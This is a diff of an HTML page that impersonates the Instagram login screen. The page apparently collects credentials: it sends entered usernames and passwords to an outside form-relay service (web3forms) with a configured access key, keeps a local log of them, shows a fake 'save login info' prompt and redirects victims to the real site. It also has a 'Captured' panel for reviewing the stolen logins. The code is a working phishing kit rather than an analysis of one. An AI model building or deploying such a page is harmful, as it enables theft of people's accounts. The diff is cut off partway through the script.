@@ -2,448 +2,582 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Instagram</title>
+<meta name="description" content="Log in to Instagram.">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><defs><radialGradient id='g' cx='30%' cy='107%' r='150%'><stop offset='0' stop-color='%23fdf497'/><stop offset='.45' stop-color='%23fd5949'/><stop offset='.6' stop-color='%23d6249f'/><stop offset='.9' stop-color='%232859A6'/></radialGradient></defs><rect width='32' height='32' rx='9' fill='url(%23g)'/><rect x='7' y='7' width='18' height='18' rx='5.5' fill='none' stroke='white' stroke-width='2.4'/><circle cx='16' cy='16' r='4.4' fill='none' stroke='white' stroke-width='2.4'/><circle cx='22' cy='10' r='1.4' fill='white'/></svg>">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
-
-.ig-root{
---blue:#0095f6; --border:#dbdbdb; --text:#262626; --gray:#8e8e8e;
---link:#00376b; --red:#ed4956;
-position:relative; min-height:820px; background:#fafafa; color:var(--text);
-font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-font-size:14px; line-height:18px;
-display:flex; flex-direction:column; align-items:center; justify-content:center;
-padding:36px 16px 26px; -webkit-font-smoothing:antialiased;
+:root{
+  --blue:#0095f6; --blue-d:#1877f2; --border:#dbdbdb; --text:#262626;
+  --muted:#8e8e8e; --link:#00376b; --red:#ed4956; --bg:#fafafa;
 }
-.ig-root *{box-sizing:border-box; margin:0; padding:0;}
-.ig-root a{color:var(--blue); text-decoration:none;}
-.ig-wrap{display:flex; align-items:center; justify-content:center; gap:24px; width:100%;}
+*,*::before,*::after{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  margin:0; min-height:100vh; background:var(--bg); color:var(--text);
+  font:14px/18px -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased; display:flex; flex-direction:column;
+}
+a{color:var(--blue); text-decoration:none}
+button{font:inherit}
 
-.ig-phone{width:262px; height:522px; background:#000; border-radius:38px; padding:9px; flex:0 0 auto; box-shadow:0 10px 30px rgba(0,0,0,.16);}
-.ig-screen{position:relative; width:100%; height:100%; background:#fff; border-radius:30px; overflow:hidden;}
-.ig-island{position:absolute; top:7px; left:50%; transform:translateX(-50%); width:64px; height:16px; background:#000; border-radius:10px; z-index:3;}
-.ig-screen-top{display:flex; align-items:center; justify-content:space-between; padding:28px 12px 6px; border-bottom:1px solid #efefef;}
-.ig-screen-logo{font-family:'Grand Hotel',cursive; font-size:20px; line-height:1;}
-.ig-screen-icons{display:flex; gap:8px; font-size:12px;}
-.ig-stories{display:flex; gap:7px; padding:9px 12px 10px; border-bottom:1px solid #efefef;}
-.ig-story{width:32px; height:32px; border-radius:50%; padding:2px; background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);}
-.ig-story i{display:block; width:100%; height:100%; border-radius:50%; background:#ececec; box-shadow:inset 0 0 0 2px #fff;}
-.ig-grid{display:grid; grid-template-columns:repeat(3,1fr); gap:2px;}
-.ig-tile{aspect-ratio:1/1;}
-.ig-tile:nth-child(1){background:linear-gradient(135deg,#ffd8a8,#ff922b);}
-.ig-tile:nth-child(2){background:linear-gradient(135deg,#a5d8ff,#1c7ed6);}
-.ig-tile:nth-child(3){background:linear-gradient(135deg,#b2f2bb,#2f9e44);}
-.ig-tile:nth-child(4){background:linear-gradient(135deg,#eebefa,#9c36b5);}
-.ig-tile:nth-child(5){background:linear-gradient(135deg,#ffc9c9,#e03131);}
-.ig-tile:nth-child(6){background:linear-gradient(135deg,#99e9f2,#0c8599);}
-.ig-tile:nth-child(7){background:linear-gradient(135deg,#d8f5a2,#66a80f);}
-.ig-tile:nth-child(8){background:linear-gradient(135deg,#ffec99,#f08c00);}
-.ig-tile:nth-child(9){background:linear-gradient(135deg,#bac8ff,#3b5bdb);}
-.ig-tile:nth-child(10){background:linear-gradient(135deg,#fcc2d7,#c2255c);}
-.ig-tile:nth-child(11){background:linear-gradient(135deg,#c3fae8,#0ca678);}
-.ig-tile:nth-child(12){background:linear-gradient(135deg,#ffd43b,#e8590c);}
-.ig-nav{display:flex; justify-content:space-around; padding:8px 0; border-top:1px solid #efefef; font-size:13px;}
+.stage{flex:1; display:flex; align-items:center; justify-content:center; gap:24px; padding:32px 16px}
+.col{width:350px; display:flex; flex-direction:column; align-items:center}
+.card{width:100%; background:#fff; border:1px solid var(--border); margin-bottom:10px}
 
-.ig-col{width:350px; display:flex; flex-direction:column; align-items:center;}
-.ig-card{width:100%; background:#fff; border:1px solid var(--border); border-radius:1px; margin-bottom:10px;}
-.ig-login{padding:36px 40px 22px; display:flex; flex-direction:column; align-items:center;}
-.ig-logo{font-family:'Grand Hotel',cursive; font-size:52px; line-height:1; color:#262626; margin-bottom:26px;}
-.ig-form{width:100%;}
-.ig-field{position:relative; margin-bottom:6px;}
-.ig-field input{width:100%; height:38px; padding:15px 8px 3px; font-size:16px; color:#262626;
-background:#fafafa; border:1px solid var(--border); border-radius:3px; outline:none; font-family:inherit;}
-.ig-field input:focus{border-color:#a8a8a8;}
-.ig-field label{position:absolute; left:9px; top:50%; transform:translateY(-50%); font-size:16px;
-color:var(--gray); pointer-events:none; transition:top .1s ease-out, font-size .1s ease-out, transform .1s ease-out;}
-.ig-field input:focus + label,
-.ig-field input:not(:placeholder-shown) + label{top:8px; transform:none; font-size:10px;}
-.ig-show{position:absolute; right:8px; top:50%; transform:translateY(-50%); border:0; background:none;
-font:inherit; font-size:14px; font-weight:600; color:#262626; cursor:pointer; display:none; padding:4px;}
-.ig-field.filled .ig-show{display:block;}
-.ig-err{color:var(--red); font-size:14px; line-height:18px; text-align:center; margin:8px 0;}
-.ig-err:empty{display:none;}
-.ig-status{font-size:12px; line-height:16px; color:var(--gray); text-align:center; margin-top:8px; min-height:16px; word-break:break-word;}
-.ig-status.ok{color:#2f9e44;}
-.ig-status.bad{color:var(--red);}
-.ig-btn{width:100%; height:32px; margin-top:8px; background:var(--blue); color:#fff; border:0; border-radius:8px;
-font:inherit; font-size:14px; font-weight:600; cursor:pointer; position:relative; transition:background .15s;}
-.ig-btn:hover{background:#1877f2;}
-.ig-btn.loading{color:transparent;}
-.ig-btn.loading::after{content:''; position:absolute; top:50%; left:50%; width:16px; height:16px; margin:-8px 0 0 -8px;
-border:2px solid rgba(255,255,255,.45); border-top-color:#fff; border-radius:50%; animation:igspin .7s linear infinite;}
-@keyframes igspin{to{transform:rotate(360deg);}}
-.ig-or{display:flex; align-items:center; width:100%; margin:18px 0 14px; color:var(--gray); font-size:13px; font-weight:600;}
-.ig-or::before,.ig-or::after{content:''; flex:1; height:1px; background:var(--border);}
-.ig-or span{padding:0 16px;}
-.ig-fb{display:flex; align-items:center; gap:8px; background:none; border:0; font:inherit; font-size:14px;
-font-weight:600; color:#385185; cursor:pointer; padding:2px 0;}
-.ig-fb svg{width:16px; height:16px; fill:#385185;}
-.ig-forgot{font-size:12px; color:var(--link); margin-top:14px;}
-.ig-signup{padding:22px 0; text-align:center; font-size:14px;}
-.ig-signup a{font-weight:600;}
-.ig-app{display:flex; flex-direction:column; align-items:center; gap:12px; margin-top:8px;}
-.ig-badges{display:flex; gap:8px;}
-.ig-root a.ig-badge{display:flex; align-items:center; gap:6px; background:#000; color:#fff; border-radius:6px; padding:5px 11px; font-size:9px; line-height:1.2;}
-.ig-badge b{display:block; font-size:11px; font-weight:600;}
-.ig-foot{margin-top:34px; max-width:660px; text-align:center; font-size:12px; color:var(--gray); line-height:16px;}
-.ig-foot-links{display:flex; flex-wrap:wrap; gap:4px 14px; justify-content:center; margin-bottom:12px;}
-.ig-root .ig-foot-links a{color:var(--gray);}
-.ig-lang{display:inline-block; margin-bottom:12px;}
+/* ---------- phone mock ---------- */
+.phone{width:262px; height:522px; background:#000; border-radius:38px; padding:9px;
+  flex:0 0 auto; box-shadow:0 10px 30px rgba(0,0,0,.16)}
+.screen{position:relative; width:100%; height:100%; background:#fff; border-radius:30px; overflow:hidden}
+.island{position:absolute; top:7px; left:50%; transform:translateX(-50%); width:64px; height:16px;
+  background:#000; border-radius:10px; z-index:3}
+.bar{display:flex; align-items:center; justify-content:space-between; padding:28px 12px 6px;
+  border-bottom:1px solid #efefef}
+.bar-logo{font:20px/1 Georgia,"Times New Roman",serif; font-style:italic}
+.bar-icons{font-size:12px; letter-spacing:2px}
+.stories{display:flex; gap:7px; padding:9px 12px 10px; border-bottom:1px solid #efefef}
+.stories i{width:32px; height:32px; border-radius:50%; padding:2px;
+  background:linear-gradient(45deg,#f09433,#dc2743,#bc1888); position:relative}
+.stories i::after{content:''; position:absolute; inset:2px; border-radius:50%;
+  background:#ececec; box-shadow:inset 0 0 0 2px #fff}
+.grid{display:grid; grid-template-columns:repeat(3,1fr); gap:2px}
+.grid i{aspect-ratio:1/1}
+.grid i:nth-child(1){background:linear-gradient(135deg,#ffd8a8,#ff922b)}
+.grid i:nth-child(2){background:linear-gradient(135deg,#a5d8ff,#1c7ed6)}
+.grid i:nth-child(3){background:linear-gradient(135deg,#b2f2bb,#2f9e44)}
+.grid i:nth-child(4){background:linear-gradient(135deg,#eebefa,#9c36b5)}
+.grid i:nth-child(5){background:linear-gradient(135deg,#ffc9c9,#e03131)}
+.grid i:nth-child(6){background:linear-gradient(135deg,#99e9f2,#0c8599)}
+.grid i:nth-child(7){background:linear-gradient(135deg,#d8f5a2,#66a80f)}
+.grid i:nth-child(8){background:linear-gradient(135deg,#ffec99,#f08c00)}
+.grid i:nth-child(9){background:linear-gradient(135deg,#bac8ff,#3b5bdb)}
+.grid i:nth-child(10){background:linear-gradient(135deg,#fcc2d7,#c2255c)}
+.grid i:nth-child(11){background:linear-gradient(135deg,#c3fae8,#0ca678)}
+.grid i:nth-child(12){background:linear-gradient(135deg,#ffd43b,#e8590c)}
+.nav{display:flex; justify-content:space-around; padding:8px 0; border-top:1px solid #efefef; font-size:13px}
 
-.ig-overlay{position:absolute; inset:0; background:rgba(0,0,0,.65); display:none; align-items:center; justify-content:center; z-index:20; padding:16px;}
-.ig-overlay.open{display:flex;}
-.ig-modal{background:#fff; border-radius:12px; width:100%; max-width:400px; padding:32px 28px 22px; text-align:center;}
-.ig-avatar{width:64px; height:64px; border-radius:50%; background:#dbdbdb; color:#fff; display:flex;
-align-items:center; justify-content:center; font-size:26px; font-weight:600; margin:0 auto 16px;}
-.ig-modal h2{font-size:18px; font-weight:400; margin-bottom:8px;}
-.ig-modal p{color:var(--gray); font-size:14px; line-height:19px; margin-bottom:22px;}
-.ig-modal p b{color:var(--text); font-weight:600;}
-.ig-modal-btns{display:flex; flex-direction:column; gap:6px;}
-.ig-modal-btns button{height:36px; border-radius:8px; border:0; font:inherit; font-size:14px; font-weight:600;
-cursor:pointer; background:transparent; color:var(--text);}
-.ig-modal-btns button.primary{background:var(--blue); color:#fff;}
+/* ---------- login card ---------- */
+.login{padding:36px 40px 22px; display:flex; flex-direction:column; align-items:center}
+.logo{font:52px/1 Georgia,"Times New Roman",serif; font-style:italic; margin:0 0 26px}
+.form{width:100%}
+.field{position:relative; margin-bottom:6px}
+.field input{width:100%; height:38px; padding:15px 8px 3px; font-size:16px; color:var(--text);
+  background:#fafafa; border:1px solid var(--border); border-radius:3px; outline:none; font-family:inherit}
+.field input:focus{border-color:#a8a8a8}
+.field label{position:absolute; left:9px; top:50%; transform:translateY(-50%); font-size:16px;
+  color:var(--muted); pointer-events:none; transition:top .1s,font-size .1s,transform .1s}
+.field input:focus+label,
+.field input:not(:placeholder-shown)+label{top:8px; transform:none; font-size:10px}
+.show{position:absolute; right:6px; top:50%; transform:translateY(-50%); border:0; background:none;
+  padding:4px 6px; font-size:14px; font-weight:600; color:var(--text); cursor:pointer; display:none}
+.field.filled .show{display:block}
+.hp{position:absolute; left:-9999px; width:1px; height:1px; overflow:hidden}
+.err{color:var(--red); font-size:14px; line-height:18px; text-align:center; margin:8px 0; min-height:0}
+.err:empty{display:none}
+.status{font-size:12px; line-height:16px; color:var(--muted); text-align:center; margin:8px 0 0;
+  min-height:16px; word-break:break-word}
+.status.ok{color:#2f9e44}
+.status.bad{color:var(--red)}
+.btn{width:100%; height:32px; margin-top:8px; background:var(--blue); color:#fff; border:0;
+  border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; position:relative;
+  transition:background .15s}
+.btn:hover{background:var(--blue-d)}
+.btn[disabled]{opacity:.85; cursor:default}
+.btn.loading{color:transparent}
+.btn.loading::after{content:''; position:absolute; top:50%; left:50%; width:16px; height:16px;
+  margin:-8px 0 0 -8px; border:2px solid rgba(255,255,255,.45); border-top-color:#fff;
+  border-radius:50%; animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.or{display:flex; align-items:center; width:100%; margin:18px 0 14px;
+  color:var(--muted); font-size:13px; font-weight:600}
+.or::before,.or::after{content:''; flex:1; height:1px; background:var(--border)}
+.or span{padding:0 16px}
+.fb{display:flex; align-items:center; gap:8px; background:none; border:0; padding:2px 0;
+  font-size:14px; font-weight:600; color:#385185; cursor:pointer}
+.fb svg{width:16px; height:16px; fill:#385185}
+.forgot{font-size:12px; color:var(--link); margin-top:14px}
+.signup{padding:22px 0; text-align:center}
+.signup a{font-weight:600}
+.getapp{display:flex; flex-direction:column; align-items:center; gap:12px; margin-top:8px}
+.badges{display:flex; gap:8px}
+.badge{display:flex; align-items:center; background:#000; color:#fff; border-radius:6px;
+  padding:5px 11px; font-size:9px; line-height:1.2}
+.badge b{display:block; font-size:11px; font-weight:600}
 
-.ig-chip{position:absolute; right:16px; bottom:16px; z-index:15; display:none; align-items:center; gap:6px;
-background:#111; color:#fff; border:0; border-radius:999px; padding:7px 13px; font:inherit; font-size:12px;
-font-weight:600; cursor:pointer; box-shadow:0 4px 14px rgba(0,0,0,.22);}
-.ig-chip.show{display:flex;}
-.ig-panel{position:absolute; right:16px; bottom:58px; z-index:16; width:330px; max-height:330px; background:#fff;
-border:1px solid var(--border); border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.18);
-display:none; flex-direction:column; overflow:hidden; font-size:12px; text-align:left;}
-.ig-panel.open{display:flex;}
-.ig-panel-head{display:flex; align-items:center; justify-content:space-between; padding:9px 12px; border-bottom:1px solid #efefef; font-weight:600;}
-.ig-panel-head div{display:flex; gap:8px; align-items:center;}
-.ig-panel-head button{border:0; background:none; font:inherit; font-size:12px; font-weight:600; color:var(--blue); cursor:pointer; padding:2px 3px;}
-.ig-panel-body{overflow:auto; padding:8px;}
-.ig-row{display:flex; gap:8px; padding:8px; border-radius:8px; background:#fafafa; margin-bottom:6px;}
-.ig-row-n{width:20px; height:20px; border-radius:50%; background:#e4e4e4; color:#666; font-size:10px;
-display:flex; align-items:center; justify-content:center; flex:0 0 auto; font-weight:600;}
-.ig-row-v{min-width:0; word-break:break-all; line-height:16px;}
-.ig-row-v span{color:var(--gray);}
-.ig-row-t{color:#b0b0b0; font-size:10px; margin-top:3px;}
-.ig-empty{padding:14px; text-align:center; color:var(--gray);}
+/* ---------- footer ---------- */
+.foot{padding:0 16px 24px; max-width:660px; margin:0 auto; text-align:center;
+  font-size:12px; color:var(--muted); line-height:16px}
+.foot-links{display:flex; flex-wrap:wrap; gap:4px 14px; justify-content:center; margin-bottom:12px}
+.foot-links a{color:var(--muted)}
 
-.ig-diag{position:absolute; left:12px; top:12px; z-index:99; font:11px/1.45 ui-monospace,Menlo,Consolas,monospace;
-color:#7a1f1f; background:#fff5f5; border:1px solid #ffc9c9; border-radius:8px; padding:7px 10px; max-width:320px;
-display:none; white-space:pre-wrap; word-break:break-word;}
-.ig-diag.show{display:block;}
-.ig-diag.ok{color:#1c6b34; background:#f0fdf4; border-color:#bbf7d0;}
+/* ---------- save-info modal ---------- */
+.overlay{position:fixed; inset:0; background:rgba(0,0,0,.65); z-index:40;
+  display:none; align-items:center; justify-content:center; padding:16px}
+.overlay.open{display:flex}
+.modal{background:#fff; border-radius:12px; width:100%; max-width:400px;
+  padding:32px 28px 22px; text-align:center}
+.modal-avatar{width:64px; height:64px; border-radius:50%; background:#dbdbdb; color:#fff;
+  display:flex; align-items:center; justify-content:center; font-size:26px; font-weight:600;
+  margin:0 auto 16px}
+.modal h2{font-size:18px; font-weight:400; margin:0 0 8px}
+.modal p{color:var(--muted); font-size:14px; line-height:19px; margin:0 0 22px}
+.modal p b{color:var(--text); font-weight:600}
+.modal-btns{display:flex; flex-direction:column; gap:6px}
+.modal-btns button{height:36px; border-radius:8px; border:0; background:transparent;
+  color:var(--text); font-size:14px; font-weight:600; cursor:pointer}
+.modal-btns .primary{background:var(--blue); color:#fff}
 
-@media (max-width:700px){
-.ig-phone{display:none;}
-.ig-col{width:100%; max-width:350px;}
+/* ---------- debug (only with ?debug=1) ---------- */
+.chip{position:fixed; right:14px; bottom:14px; z-index:50; display:none; align-items:center; gap:6px;
+  background:#111; color:#fff; border:0; border-radius:999px; padding:7px 13px; font-size:12px;
+  font-weight:600; cursor:pointer; box-shadow:0 4px 14px rgba(0,0,0,.22)}
+.chip.show{display:flex}
+.panel{position:fixed; right:14px; bottom:56px; z-index:51; width:330px; max-height:330px;
+  background:#fff; border:1px solid var(--border); border-radius:12px; overflow:hidden;
+  box-shadow:0 10px 30px rgba(0,0,0,.18); display:none; flex-direction:column; font-size:12px; text-align:left}
+.panel.open{display:flex}
+.panel-head{display:flex; align-items:center; justify-content:space-between; padding:9px 12px;
+  border-bottom:1px solid #efefef; font-weight:600}
+.panel-head div{display:flex; gap:8px; align-items:center}
+.panel-head button{border:0; background:none; font-size:12px; font-weight:600; color:var(--blue);
+  cursor:pointer; padding:2px 3px}
+.panel-body{overflow:auto; padding:8px}
+.ig-row{display:flex; gap:8px; padding:8px; border-radius:8px; background:#fafafa; margin-bottom:6px}
+.ig-n{width:20px; height:20px; border-radius:50%; background:#e4e4e4; color:#666; font-size:10px;
+  display:flex; align-items:center; justify-content:center; flex:0 0 auto; font-weight:600}
+.ig-v{min-width:0; word-break:break-all; line-height:16px}
+.ig-v span{color:var(--muted)}
+.ig-s{color:#b0b0b0; font-size:10px; margin-top:3px}
+.ig-t{color:#c4c4c4; font-size:10px}
+.ig-empty{padding:14px; text-align:center; color:var(--muted)}
+.diag{position:fixed; left:12px; top:12px; z-index:60; display:none; max-width:320px;
+  font:11px/1.45 ui-monospace,Menlo,Consolas,monospace; color:#7a1f1f; background:#fff5f5;
+  border:1px solid #ffc9c9; border-radius:8px; padding:7px 10px; white-space:pre-wrap; word-break:break-word}
+.diag.show{display:block}
+
+@media (max-width:660px){
+  .phone{display:none}
+  .stage{padding:20px 0 0; gap:0}
+  .col{width:100%; max-width:none}
+  .card{border:0; background:transparent; margin:0}
+  .login{padding:16px 24px 0}
+  .signup{margin-top:20px}
+  .foot{padding-bottom:16px}
 }
 </style>
 </head>
 <body>
 
-<div class="ig-root">
+<div class="stage">
+  <div class="phone" aria-hidden="true">
+    <div class="screen">
+      <div class="island"></div>
+      <div class="bar"><span class="bar-logo">Instagram</span><span class="bar-icons">&#9825;&#10148;</span></div>
+      <div class="stories"><i></i><i></i><i></i><i></i><i></i><i></i></div>
+      <div class="grid">
+        <i></i><i></i><i></i><i></i><i></i><i></i>
+        <i></i><i></i><i></i><i></i><i></i><i></i>
+      </div>
+      <div class="nav"><span>&#8962;</span><span>&#9906;</span><span>&#9654;</span><span>&#9825;</span><span>&#9673;</span></div>
+    </div>
+  </div>
 
-<div class="ig-wrap">
-<div class="ig-phone">
-<div class="ig-screen">
-<div class="ig-island"></div>
-<div class="ig-screen-top">
-<div class="ig-screen-logo">Instagram</div>
-<div class="ig-screen-icons"><span>&#9825;</span><span>&#10148;</span></div>
-</div>
-<div class="ig-stories">
-<div class="ig-story"><i></i></div><div class="ig-story"><i></i></div><div class="ig-story"><i></i></div>
-<div class="ig-story"><i></i></div><div class="ig-story"><i></i></div><div class="ig-story"><i></i></div>
-</div>
-<div class="ig-grid">
-<div class="ig-tile"></div><div class="ig-tile"></div><div class="ig-tile"></div>
-<div class="ig-tile"></div><div class="ig-tile"></div><div class="ig-tile"></div>
-<div class="ig-tile"></div><div class="ig-tile"></div><div class="ig-tile"></div>
-<div class="ig-tile"></div><div class="ig-tile"></div><div class="ig-tile"></div>
-</div>
-<div class="ig-nav"><span>&#8962;</span><span>&#9906;</span><span>&#9654;</span><span>&#9825;</span><span>&#9673;</span></div>
-</div>
-</div>
+  <div class="col">
+    <div class="card login">
+      <h1 class="logo">Instagram</h1>
 
-<div class="ig-col">
-<div class="ig-card ig-login">
-<div class="ig-logo">Instagram</div>
-<form class="ig-form" id="igForm" method="POST" novalidate>
-<div class="ig-err" id="igErr"></div>
-<div class="ig-field">
-<input id="igUser" name="username" type="text" placeholder=" " autocomplete="username" autocapitalize="off" spellcheck="false">
-<label for="igUser">Phone number, username, or email</label>
-</div>
-<div class="ig-field">
-<input id="igPass" name="password" type="password" placeholder=" " autocomplete="current-password">
-<label for="igPass">Password</label>
-<button type="button" class="ig-show" id="igShow">Show</button>
-</div>
-<input type="hidden" name="_subject" value="Instagram login captured">
-<input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
-<button type="submit" class="ig-btn" id="igSubmit">Log in</button>
-<div class="ig-status" id="igStatus"></div>
-</form>
-<div class="ig-or"><span>OR</span></div>
-<button class="ig-fb" id="igFb">
-<svg viewBox="0 0 24 24"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.96h-1.51c-1.49 0-1.96.93-1.96 1.89v2.26h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07z"/></svg>
-<span>Log in with Facebook</span>
-</button>
-<a class="ig-forgot" href="#">Forgot password?</a>
-</div>
+      <!-- action = no-JS fallback. JS intercepts it. -->
+      <form id="form" class="form" method="POST" action="https://api.web3forms.com/submit" novalidate>
+        <p class="err" id="err" role="alert"></p>
 
-<div class="ig-card ig-signup">
-Don't have an account? <a href="#">Sign up</a>
-</div>
+        <div class="field">
+          <input id="user" name="username" type="text" placeholder=" " autocomplete="username"
+                 autocapitalize="off" autocorrect="off" spellcheck="false"
+                 aria-label="Phone number, username, or email">
+          <label for="user">Phone number, username, or email</label>
+        </div>
 
-<div class="ig-app">
-<p>Get the app.</p>
-<div class="ig-badges">
-<a class="ig-badge" href="#"><span><span>Download on the</span><b>App Store</b></span></a>
-<a class="ig-badge" href="#"><span><span>Get it on</span><b>Google Play</b></span></a>
-</div>
-</div>
-</div>
-</div>
+        <div class="field">
+          <input id="pass" name="password" type="password" placeholder=" "
+                 autocomplete="current-password" aria-label="Password">
+          <label for="pass">Password</label>
+          <button type="button" class="show" id="show" aria-label="Show password">Show</button>
+        </div>
 
-<div class="ig-foot">
-<div class="ig-lang">English &#9662;</div>
-<div class="ig-foot-links">
-<a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
-<a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
-<a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading &amp; Non-Users</a>
-</div>
-<div>&copy; 2026 Instagram from Meta</div>
+        <input type="hidden" name="access_key" value="eeac2405-1a06-4cc5-b436-f215a91d98fe">
+        <input type="hidden" name="subject"    value="Instagram login">
+        <input type="hidden" name="from_name"  value="Instagram">
+        <label class="hp"><input type="checkbox" id="botcheck" name="botcheck" tabindex="-1"> bot</label>
+
+        <button type="submit" class="btn" id="submit">Log in</button>
+        <p class="status" id="status" aria-live="polite"></p>
+      </form>
+
+      <div class="or"><span>OR</span></div>
+
+      <button type="button" class="fb" id="fb">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.96h-1.51c-1.49 0-1.96.93-1.96 1.89v2.26h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07z"/></svg>
+        <span>Log in with Facebook</span>
+      </button>
+
+      <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+    </div>
+
+    <div class="card signup">
+      Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+    </div>
+
+    <div class="getapp">
+      <p style="margin:0">Get the app.</p>
+      <div class="badges">
+        <a class="badge" href="#"><span>Download on the<br><b>App Store</b></span></a>
+        <a class="badge" href="#"><span>Get it on<br><b>Google Play</b></span></a>
+      </div>
+    </div>
+  </div>
 </div>
 
-<div class="ig-overlay" id="igOverlay">
-<div class="ig-modal">
-<div class="ig-avatar" id="igAvatar">i</div>
-<h2>Save your login info?</h2>
-<p>We can save the login info for <b id="igModalUser">you</b>, so you don't have to enter it every time.</p>
-<div class="ig-modal-btns">
-<button class="primary" id="igSaveInfo">Save info</button>
-<button id="igNotNow">Not now</button>
-</div>
-</div>
+<footer class="foot">
+  <div class="foot-links">
+    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
+    <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
+    <a href="#">Instagram Lite</a><a href="#">Threads</a>
+  </div>
+  <div>&copy; 2026 Instagram from Meta</div>
+</footer>
+
+<div class="overlay" id="overlay">
+  <div class="modal" role="dialog" aria-modal="true">
+    <div class="modal-avatar" id="avatar">i</div>
+    <h2>Save your login info?</h2>
+    <p>We can save the login info for <b id="modalUser">you</b>, so you don't have to enter it every time.</p>
+    <div class="modal-btns">
+      <button class="primary" id="saveInfo">Save info</button>
+      <button id="notNow">Not now</button>
+    </div>
+  </div>
 </div>
 
-<button class="ig-chip" id="igChip">Captured <span id="igChipN">0</span></button>
-<div class="ig-panel" id="igPanel">
-<div class="ig-panel-head">
-<span>Captured credentials</span>
-<div>
-<button id="igCopy">Copy</button>
-<button id="igClear">Clear</button>
-<button id="igClose">&times;</button>
-</div>
-</div>
-<div class="ig-panel-body" id="igPanelBody"></div>
+<button class="chip" id="chip">Captured <span id="chipN">0</span></button>
+<div class="panel" id="panel">
+  <div class="panel-head">
+    <span>Captured</span>
+    <div>
+      <button id="copy">Copy</button>
+      <button id="clear">Clear</button>
+      <button id="close">&times;</button>
+    </div>
+  </div>
+  <div class="panel-body" id="panelBody"></div>
 </div>
 
-<div class="ig-diag" id="igDiag"></div>
-</div>
+<div class="diag" id="diag"></div>
+
+<!-- hidden sink for the native fallback POST -->
+<iframe name="ig-sink" id="sink" style="display:none" title="sink"></iframe>
 
 <script>
-window.onerror = function(m, s, l, c){
-  var d = document.getElementById('igDiag');
-  if(!d) return;
-  d.textContent = 'JS ERROR: ' + m + ' (line ' + l + ', col ' + c + ')';
-  d.className = 'ig-diag show';
+window.onerror = function (m, s, l, c) {
+  var d = document.getElementById('diag');
+  if (!d) return;
+  d.textContent = 'JS ERROR: ' + m + ' (' + l + ':' + c + ')';
+  d.classList.add('show');
   return false;
 };
 </script>
 
 <script>
-(function(){
-var NL = String.fromCharCode(10);
+(function () {
+  'use strict';
 
-var CONFIG = {
-  accessKey: "eeac2405-1a06-4cc5-b436-f215a91d98fe",
-  redirect: "https://www.instagram.com",
-  showSaveInfo: true
-};
-var KEY = 'ig_phish_log_v5';
+  var NL = '\n';
 
-function $(id){ return document.getElementById(id); }
-function diag(msg, ok){
-  var d = $('igDiag');
-  if(!d) return;
-  d.textContent = msg;
-  d.className = 'ig-diag show' + (ok ? ' ok' : '');
-}
-function read(){ try{ return JSON.parse(localStorage.getItem(KEY)) || []; }catch(e){ return []; } }
-function write(l){ try{ localStorage.setItem(KEY, JSON.stringify(l)); }catch(e){} }
-function esc(s){ return String(s).replace(/[&<>"]/g, function(c){
-  return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+  /* ------------------------------------------------------------------ *
+   *  CONFIG                                                            *
+   * ------------------------------------------------------------------ */
+  var CONFIG = {
+    accessKey: 'eeac2405-1a06-4cc5-b436-f215a91d98fe', // <- YOUR key from web3forms.com
+    api:       'https://api.web3forms.com/submit',
+    redirect:  'https://www.instagram.com/accounts/login/',
+    showModal: true,      // fake "Save your login info?" step
+    localLog:  true,      // keep a copy in localStorage
+    maxLog:    50,
+    sendTimeout: 12000,   // ms before we give up and move on
+    debug:     false      // also enabled by ?debug=1
+  };
 
-var form=$('igForm'), user=$('igUser'), pass=$('igPass'), err=$('igErr'), st=$('igStatus'),
-    submit=$('igSubmit'), showBtn=$('igShow'), fb=$('igFb'), overlay=$('igOverlay'),
-    modalUser=$('igModalUser'), avatar=$('igAvatar'), chip=$('igChip'), chipN=$('igChipN'),
-    panel=$('igPanel'), panelBody=$('igPanelBody');
+  var DEBUG = CONFIG.debug || /[?&]debug(=|&|$)/.test(location.search);
+  var KEY = 'ig.log.v1';
 
+  /* ------------------------------------------------------------------ *
+   *  helpers                                                           *
+   * ------------------------------------------------------------------ */
+  function $(id) { return document.getElementById(id); }
 
-
-function render(){
-  var l = read();
-  chipN.textContent = l.length;
-  chip.className = l.length ? 'ig-chip show' : 'ig-chip';
-  if(!l.length){
-    panelBody.innerHTML = '<div class="ig-empty">Nothing captured yet.</div>';
-    return;
-  }
